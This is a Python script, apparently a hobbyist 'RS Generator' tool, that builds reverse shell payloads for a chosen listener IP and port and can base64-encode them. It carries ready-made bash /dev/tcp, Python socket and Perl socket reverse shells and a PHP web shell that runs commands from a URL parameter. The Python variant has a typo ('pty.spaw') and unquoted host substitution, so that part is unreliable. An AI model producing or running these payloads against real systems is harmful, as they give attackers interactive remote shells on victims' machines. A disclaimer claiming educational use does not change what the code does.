#!/usr/bin/env python3
# This script is just use for educational purposes
# I am not responsible for any damage caused by this script, use it at your own risk.
import base64
import argparse
import time
from pwn import *

panel = r"""
__________  _________   ________                                   __                
\______   \/   _____/  /  _____/  ____   ____   ________________ _/  |_  ___________ 
 |       _/\_____  \  /   \  ____/ __ \ /    \_/ __ \_  __ \__  \\   __\/  _ \_  __ \
 |    |   \/        \ \    \_\  \  ___/|   |  \  ___/|  | \// __ \|  | (  <_> )  | \/
 |____|_  /_______  /  \______  /\___  >___|  /\___  >__|  (____  /__|  \____/|__|   
        \/        \/          \/     \/     \/     \/           \/                   
"""

# Shells dictionary with the most common reverse shells, you can add more if you want
shells = {
    "bash": f"bash -i >& /dev/tcp/lhost/lport 0>&1", 
    "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((lhost,lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spaw(\"sh\")'",
    "php-web": "<?php system($_GET['cmd']) ?>",
    "perl": f"perl -e 'use Socket;$i=\"lhost\";$p=lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
}

# Function to encode the payload in base64
def encoder(s):
    string = s
    string_utf = string.encode("utf-8")
    string_utf_encode = base64.b64encode(string_utf)
    payload = string_utf_encode.decode("utf-8")

    return payload # Return the encoded payload as a string

if __name__ == "__main__":
    try:
        print(panel)
        log.info("Script created by: Inzego\n")

        time.sleep(2)
        parser = argparse.ArgumentParser(description="Reverse Shell generator")
        parser.add_argument("--lhost", required=True, help="Your machine ip")
        parser.add_argument("--lport", required=True, help="Your listening port")
        parser.add_argument("-s", "--shell", required=True, choices=shells.keys(), help="Shell type")
        parser.add_argument("-e", "--encoder", action="store_true", help="Encode the payload in base64")
        args = parser.parse_args()

        lhost = args.lhost
        lport = args.lport

        # Call a selected shell from the shells dictionary and replace lhost and lport with the user input
        a = shells.get(f"{args.shell}").replace("lhost", lhost).replace("lport", lport)

        # Simple if statement to check if the user wants to encode the payload or not
        if args.encoder is True:
            rev = encoder(a)
            log.success(f"Encoded payload: {rev}")
        else:
            log.success(f"Payload: {a}")

    except KeyboardInterrupt:
        log.error("Exiting...")